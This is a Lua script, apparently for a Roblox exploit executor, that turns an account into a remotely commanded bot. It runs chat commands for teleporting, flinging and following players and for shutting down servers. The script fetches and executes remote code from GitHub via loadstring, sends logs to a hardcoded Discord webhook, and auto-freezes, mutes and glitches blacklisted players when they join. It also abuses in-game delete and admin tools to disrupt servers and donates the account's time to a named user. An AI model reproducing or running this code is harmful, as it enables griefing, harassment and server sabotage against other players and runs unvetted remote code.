local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local spinning = false
local scriptConnection = nil
local following = false
local followTarget = nil
local autoR6 = false
local antiafk = false
local blacklistEnabled = false
local blacklistedPlayers = {}

local ownersURL = "https://raw.githubusercontent.com/Ali-droidlol/BlacklistTCO/main/Users.json"
local blacklistURL = "https://raw.githubusercontent.com/Ali-droidlol/BlacklistTCO/refs/heads/main/blacklist.json"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1522386948784914432/pZvX1VBo1DQ-z4fpkh4cOI3VecKbqx4Mc7HZTATkLklIklXbaZctX4VBaUhTMUvwLBdb"
local WHITELIST_ACCOUNT = "blacklistv2tco"
local BLACKLIST_ACCOUNT = "blacklistv2tco"
local GameId = tostring(game.GameId)
local JobId = tostring(game.JobId)
local GITHUB_COMMAND_URL = "http://localhost:3000/command"
local lastCommandId = nil

local COMMAND_LIST = [[
!antiafk
!autor6
!cmds
!credits
!dall
!dance
!disablebkit
!donate
!fling
!follow
!freeze
!glaze
!jump
!quickvamp
!rejoin
!reset
!say
!servershutdown
!spin
!stop
!stopdance
!teleport
!tp2
!unfollow
!unfreeze
!unspin
]]

local ownerUsernames = {}

UserInputService.WindowFocusReleased:Connect(function()
	task.wait(0.1)
	game:GetService("ReplicatedStorage"):WaitForChild("System"):FireServer("Focused")
end)

local success, response = pcall(function()
	return game:HttpGet(ownersURL)
end)

if success then
	ownerUsernames = HttpService:JSONDecode(response)
else
	warn("Failed to load owners!")
	return
end

-- Load blacklist from URL
local function loadBlacklist()
	local ok, res = pcall(function()
		return game:HttpGet(blacklistURL)
	end)
	if ok and res then
		local decoded = HttpService:JSONDecode(res)
		blacklistedPlayers = decoded
	else
		warn("Failed to load blacklist!")
	end
end

local function isBlacklisted(player)
	return blacklistedPlayers[player.Name] == true
end

-- Run freeze/mute/glitch on a blacklisted player
-- Only fires when the local account is blacklistv3tco

local function sendCommandList()
	if LocalPlayer.Name ~= WHITELIST_ACCOUNT then return end
	local payload=HttpService:JSONEncode({username="Alt Bot Commands",embeds={{{title="📜 Available Commands",description="```"..COMMAND_LIST.."```",color=3447003,footer={text="Alt Bot V4.5"}}}}})
	pcall(function() request({Url=WEBHOOK_URL,Method="POST",Headers={["Content-Type"]="application/json"},Body=payload}) end)
end

local function chat(msg)
	-- TextChatService first — correct path for modern servers
	local sent = false
	pcall(function()
		local channel = TextChatService.TextChannels:WaitForChild("RBXGeneral", 10)
		if channel then
			channel:SendAsync(msg)
			sent = true
		end
	end)

	-- Legacy fallback only if TextChatService path failed
	if not sent then
		pcall(function()
			ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
		end)
	end
end


local function punishPlayer(player)
	if LocalPlayer.Name ~= BLACKLIST_ACCOUNT then
		return
	end
	print('punishing player')
	chat(";freeze " .. player.Name)
	task.wait(0.5)
	chat(";mute " .. player.Name)
	task.wait(1)
	chat(";glitch " .. player.Name)
	print('done')
end

-- Discord webhook logger — fires only when account is blacklistv2tco
local function sendWebhookLog(executor, command, args, cmdSuccess, cmdError)
	if LocalPlayer.Name ~= WHITELIST_ACCOUNT then
		return
	end

	local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
	local statusIcon = cmdSuccess and "✅" or "❌"
	local color = cmdSuccess and 3066993 or 15158332

	local fields = {
		{ name = "👤 Executor",          value = "```" .. executor .. "```",                              inline = true  },
		{ name = "⌨️ Command",           value = "```!" .. command .. "```",                              inline = true  },
		{ name = "📝 Arguments",         value = args ~= "" and ("```" .. args .. "```") or "```None```", inline = true  },
		{ name = statusIcon .. " Status",value = cmdSuccess and "```Success```" or "```Failed```",        inline = true  },
		{ name = "🎮 Game ID",           value = "```" .. GameId .. "```",                                inline = true  },
		{ name = "🔑 Job ID",            value = "```" .. JobId .. "```",                                 inline = true  },
		{ name = "🕐 Timestamp",         value = "```" .. timestamp .. "```",                             inline = false },
	}

	if cmdError then
		table.insert(fields, {
			name  = "⚠️ Error",
			value = "```" .. cmdError .. "```",
			inline = false
		})
	end

	local payload = HttpService:JSONEncode({
		username = "Alt Bot Logger",
		embeds = {
			{
				title  = statusIcon .. " Command Executed",
				color  = color,
				fields = fields,
				footer = { text = "blacklistv2tco • Alt Bot V4.5" }
			}
		}
	})

	pcall(function()
		request({
			Url     = WEBHOOK_URL,
			Method  = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body    = payload
		})
	end)
end


chat("script loading Credits to HOT_DOGN -- Alt Bot Private")

pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
end)

local function isOwner(player)
	return ownerUsernames[player.Name] == true
end

local function findPlayerByPartial(partial)
	partial = partial:lower()
	for _, p in ipairs(Players:GetPlayers()) do
		if p.Name:lower():find(partial, 1, true) or p.DisplayName:lower():find(partial, 1, true) then
			return p
		end
	end
	return nil
end

local VirtualUser = game:GetService("VirtualUser")

task.spawn(function()
	while true do
		task.wait(600)
		if antiafk then
			pcall(function()
				VirtualUser:ClickButton1(Vector2.new(0, 0))
			end)
		end
	end
end)

task.spawn(function()
	while true do
		if following and followTarget then
			local myChar = LocalPlayer.Character
			local targetChar = followTarget.Character
			if myChar and targetChar then
				local myHRP = myChar:FindFirstChild("HumanoidRootPart")
				local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
				if myHRP and targetHRP then
					myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
				end
			end
		end
		task.wait(0.1)
	end
end)

-- Blacklist join listener — punish on PlayerAdded if blacklist is active
Players.PlayerAdded:Connect(function(newPlayer)
	if blacklistEnabled and isBlacklisted(newPlayer) then
		task.wait(1) -- let the player load in
		punishPlayer(newPlayer)
	end

	if autoR6 then
		local character = LocalPlayer.Character
		local backpack = LocalPlayer:FindFirstChild("Backpack")
		if not character or not backpack then return end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		local arkenstone = character:FindFirstChild("The Arkenstone") or backpack:FindFirstChild("The Arkenstone")
		if arkenstone then
			if arkenstone.Parent == backpack then
				humanoid:EquipTool(arkenstone)
				task.wait(0.5)
			end
			task.wait(1)
			chat(";r6 " .. newPlayer.Name)
		end
	end
end)

local function handleMessage(message, fromGitHub, githubCommand)

	local player
	local msg

	if fromGitHub then
		player = LocalPlayer
		msg = "!" .. githubCommand
	else
		if not message.TextSource then return end

		player = Players:GetPlayerByUserId(message.TextSource.UserId)
		if not player then return end
		if not isOwner(player) then return end

		msg = tostring(message.Text)
	end

	local command, text = msg:match("^!(%w+)%s*(.*)$")
	if not command then return end

	local cmdSuccess = false
	local cmdError = nil

	-- COMMANDS START HERE

	if command == "cmds" then
		local payload = HttpService:JSONEncode({
			username = "Alt Bot Commands",
			embeds = {{
				title = "📜 Available Commands",
				description = "```"..COMMAND_LIST.."```",
				color = 3447003
			}}
		})

		pcall(function()
			request({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = payload
			})
		end)

		cmdSuccess = true

	elseif command == "say" then
		if text ~= "" then
			pcall(function() chat(text) cmdSuccess = true end)
		else
			cmdError = "No message provided"
		end

	-- (ALL your other commands stay EXACTLY the same below this)

	elseif command == "teleport" or command == "tp" then
		pcall(function()
			local myChar    = LocalPlayer.Character
			local ownerChar = player.Character
			if myChar and ownerChar then
				local myHRP    = myChar:FindFirstChild("HumanoidRootPart")
				local ownerHRP = ownerChar:FindFirstChild("HumanoidRootPart")
				if myHRP and ownerHRP then
					myHRP.CFrame = ownerHRP.CFrame
					cmdSuccess = true
				end
			end
		end)

	elseif command == "tp2" then
		if text == "" then
			cmdError = "No target specified"
		else
			pcall(function()
				local target = findPlayerByPartial(text)
				if not target then cmdError = "Target not found" return end
				local myChar     = LocalPlayer.Character
				local targetChar = target.Character
				if myChar and targetChar then
					local myHRP     = myChar:FindFirstChild("HumanoidRootPart")
					local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
					if myHRP and targetHRP then
						myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
						cmdSuccess = true
					end
				end
			end)
		end

	elseif command == "fling" then
		if text ~= "" then
			pcall(function() chat(".fling " .. text) cmdSuccess = true end)
		else
			cmdError = "No target specified"
		end

	elseif command == "glaze" or command == "glz" then
		if text ~= "" then
			pcall(function() chat(text .. " is the best") cmdSuccess = true end)
		end

	elseif command == "donate" then
		if text ~= "" then
			pcall(function() chat("donate " .. text) cmdSuccess = true end)
		end

	elseif command == "dall" then
		pcall(function()
			local timeValue = Players.LocalPlayer.leaderstats.Time.Value
			chat("donate hot.dogn " .. timeValue)
			cmdSuccess = true
		end)

	elseif command == "credits" then
		pcall(function() chat("Alt Bot V4.5 Private - Hot_Dogn") cmdSuccess = true end)

	elseif command == "reset" then
		pcall(function()
			local character = LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then humanoid.Health = 0 cmdSuccess = true end
			end
		end)

	elseif command == "jump" then
		pcall(function()
			local character = LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then humanoid.Jump = true cmdSuccess = true end
			end
		end)

	elseif command == "spin" then
		pcall(function()
			local speed = tonumber(text)
			if not speed or speed <= 0 then speed = 5 end
			if spinning then spinning = speed cmdSuccess = true return end
			spinning = speed
			task.spawn(function()
				while spinning do
					local character = LocalPlayer.Character
					if character then
						local hrp = character:FindFirstChild("HumanoidRootPart")
						if hrp then hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(spinning), 0) end
					end
					task.wait(0.03)
				end
			end)
			cmdSuccess = true
		end)

	elseif command == "unspin" then
		spinning = false
		cmdSuccess = true

	elseif command == "freeze" or command == "fr" then
		pcall(function()
			local character = LocalPlayer.Character
			if character then
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if hrp then hrp.Anchored = true cmdSuccess = true end
			end
		end)

	elseif command == "unfreeze" or command == "ufr" then
		pcall(function()
			local character = LocalPlayer.Character
			if character then
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if hrp then hrp.Anchored = false cmdSuccess = true end
			end
		end)

	elseif command == "dance" or command == "d" then
		pcall(function()
			local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			if hum then
				hum.WalkSpeed = 0
				local animator = hum:FindFirstChildOfClass("Animator")
				if animator then
					local anim = Instance.new("Animation")
					anim.AnimationId = "rbxassetid://507770239"
					animator:LoadAnimation(anim):Play()
					cmdSuccess = true
				end
			end
		end)

	elseif command == "stopdance" or command == "sd" then
		pcall(function()
			local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			if hum then
				hum.WalkSpeed = 16
				local animator = hum:FindFirstChildOfClass("Animator")
				if animator then
					for _, track in ipairs(animator:GetPlayingAnimationTracks()) do track:Stop() end
					cmdSuccess = true
				end
			end
		end)

	elseif command == "rejoin" or command == "rj" then
		pcall(function()
			queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/Ali-droidlol/BlacklistTCO/refs/heads/main/BotScript"))
			task.wait(0.5)
			TeleportService:Teleport(game.PlaceId, LocalPlayer)
			cmdSuccess = true
		end)

	elseif command == "antiafk" then
		if text:lower() == "t" or text:lower() == "on" then
			antiafk = true
			chat("Anti-AFK enabled")
		elseif text:lower() == "f" or text:lower() == "off" then
			antiafk = false
			chat("Anti-AFK disabled")
		else
			antiafk = not antiafk
			chat("Anti-AFK " .. (antiafk and "enabled" or "disabled"))
		end
		cmdSuccess = true

	elseif command == "stop" then
		spinning = false
		following = false
		followTarget = nil
		autoR6 = false
		antiafk = false
		blacklistEnabled = false
		if scriptConnection then
			scriptConnection:Disconnect()
			scriptConnection = nil
		end
		chat("Bot stopped.")
		cmdSuccess = true

	elseif command == "follow" or command == "fl" then
		if text == "" then
			cmdError = "No target specified"
		else
			pcall(function()
				local target = findPlayerByPartial(text)
				if not target then cmdError = "Target not found" return end
				followTarget = target
				following    = true
				cmdSuccess   = true
			end)
		end

	elseif command == "unfollow" or command == "ufl" then
		following    = false
		followTarget = nil
		cmdSuccess   = true

	elseif command == "autor6" then
		if text:lower() == "t" then
			pcall(function()
				local character = LocalPlayer.Character
				local backpack  = LocalPlayer:FindFirstChild("Backpack")
				if not character or not backpack then cmdError = "Character or backpack not found" return end
				local humanoid   = character:FindFirstChildOfClass("Humanoid")
				local arkenstone = character:FindFirstChild("The Arkenstone") or backpack:FindFirstChild("The Arkenstone")
				if not arkenstone then cmdError = "The Arkenstone not found" return end
				if arkenstone.Parent == backpack then humanoid:EquipTool(arkenstone) task.wait(0.5) end
				chat(";r6 a")
				task.wait(0.5)
				autoR6     = true
				cmdSuccess = true
			end)
		elseif text:lower() == "f" then
			autoR6     = false
			cmdSuccess = true
		end

	elseif command == "quickvamp" or command == "qv" then
		if text == "" then
			cmdError = "No target specified"
		else
			pcall(function()
				local target    = findPlayerByPartial(text)
				if not target then cmdError = "Target not found" return end
				local character = LocalPlayer.Character
				local backpack  = LocalPlayer:FindFirstChild("Backpack")
				if not character or not backpack then cmdError = "Character or backpack not found" return end
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				local vamp     = character:FindFirstChild("VampireVanquisher") or backpack:FindFirstChild("VampireVanquisher")
				if not vamp then
					local arkenstone = character:FindFirstChild("The Arkenstone") or backpack:FindFirstChild("The Arkenstone")
					if arkenstone then
						if arkenstone.Parent == backpack then humanoid:EquipTool(arkenstone) task.wait(0.5) end
						chat(";gear me 94794847")
						task.wait(1)
					else
						cmdError = "The Arkenstone not found"
						return
					end
				end
				local arkenstone = character:FindFirstChild("The Arkenstone") or backpack:FindFirstChild("The Arkenstone")
				if arkenstone then
					if arkenstone.Parent == backpack then humanoid:EquipTool(arkenstone) task.wait(0.5) end
					chat(";ff a")     task.wait(0.5)
					chat(";god a")    task.wait(0.5)
					chat(";unff "   .. target.Name) task.wait(0.5)
					chat(";ungod "  .. target.Name) task.wait(0.5)
				end
				vamp = character:FindFirstChild("VampireVanquisher") or backpack:FindFirstChild("VampireVanquisher")
				if not vamp then cmdError = "VampireVanquisher not found" return end
				if vamp.Parent == backpack then humanoid:EquipTool(vamp) task.wait(0.3) end
				local elapsed = 0
				task.spawn(function()
					while elapsed < 10 do
						local myChar     = LocalPlayer.Character
						local targetChar = target.Character
						if not myChar or not targetChar then break end
						local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
						if not targetHumanoid or targetHumanoid.Health <= 0 then break end
						local myHRP     = myChar:FindFirstChild("HumanoidRootPart")
						local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
						if myHRP and targetHRP then
							myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 2)
						end
						task.wait(0.1)
						elapsed = elapsed + 0.1
					end
				end)
				cmdSuccess = true
			end)
		end

	elseif command == "disablebkit" or command == "dbk" then
		pcall(function()
			local character  = LocalPlayer.Character
			local backpack   = LocalPlayer:FindFirstChild("Backpack")
			if not character or not backpack then cmdError = "Character or backpack not found" return end
			local humanoid   = character:FindFirstChildOfClass("Humanoid")
			local deleteTool = character:FindFirstChild("Delete") or backpack:FindFirstChild("Delete")
			if deleteTool then
				if deleteTool.Parent == backpack then humanoid:EquipTool(deleteTool) task.wait(0.5) end
				local dtool = character:FindFirstChild("Delete")
				if dtool and dtool:FindFirstChild("Script") then
					dtool.Script.Event:FireServer(game.ReplicatedStorage.Brick, character.HumanoidRootPart.Position)
					cmdSuccess = true
				end
			else
				cmdError = "Delete tool not found"
			end
		end)

	elseif command == "servershutdown" or command == "ssh" then
		pcall(function()
			local character  = LocalPlayer.Character
			local backpack   = LocalPlayer:FindFirstChild("Backpack")
			if not character or not backpack then cmdError = "Character or backpack not found" return end
			local humanoid   = character:FindFirstChildOfClass("Humanoid")
			local deleteTool = character:FindFirstChild("Delete") or backpack:FindFirstChild("Delete")
			if deleteTool then
				if deleteTool.Parent == backpack then humanoid:EquipTool(deleteTool) task.wait(0.5) end
				local dtool = character:FindFirstChild("Delete")
				if dtool and dtool:FindFirstChild("Script") then
					dtool.Script.Event:FireServer(game.ReplicatedStorage.Brick, character.HumanoidRootPart.Position)
				end
			else
				local arkenstone = character:FindFirstChild("The Arkenstone") or backpack:FindFirstChild("The Arkenstone")
				if arkenstone then
					if arkenstone.Parent == backpack then humanoid:EquipTool(arkenstone) task.wait(0.5) end
					chat(";bkit me")
					task.wait(1)
				else
					cmdError = "The Arkenstone not found"
					return
				end
			end
			local arkenstone = character:FindFirstChild("The Arkenstone") or backpack:FindFirstChild("The Arkenstone")
			if arkenstone then
				if arkenstone.Parent == backpack then humanoid:EquipTool(arkenstone) task.wait(0.5) end
				chat("delcubes a") task.wait(1)
				chat("maptide nan") task.wait(0.5)
				chat("reset o")
				cmdSuccess = true
			end
		end)
	end

	sendWebhookLog(player.Name, command, text, cmdSuccess, cmdError)
end

task.spawn(function()
	local channel = TextChatService.TextChannels:WaitForChild("RBXGeneral", 10)
	if channel then
		scriptConnection = channel.MessageReceived:Connect(handleMessage)
	else
		warn("RBXGeneral not found — commands disabled")
	end
end)

task.spawn(function()
	while task.wait(0.5) do
		local ok, res = pcall(function()
			return request({
				Url     = GITHUB_COMMAND_URL .. "?t=" .. tostring(os.time()),
				Method  = "GET",
				Headers = {
					["Cache-Control"] = "no-cache, no-store",
					["Pragma"]        = "no-cache",
					["Accept"]        = "application/vnd.github.v3.raw"
				}
			})
		end)

		if not ok or not res then continue end

		local body = res.Body or res.body
		if not body or body == "" then continue end

		local ok2, data = pcall(function()
			return HttpService:JSONDecode(body)
		end)

		if not ok2 or not data then continue end
		if type(data.id) ~= "number" then continue end

		-- First read — store the id silently, don't fire
		if lastCommandId == nil then
			lastCommandId = data.id
			continue
		end

		-- Only fire when id actually changes after boot
		if data.id == lastCommandId then continue end

		lastCommandId = data.id
		handleMessage(nil, true, data.command)
	end
end)


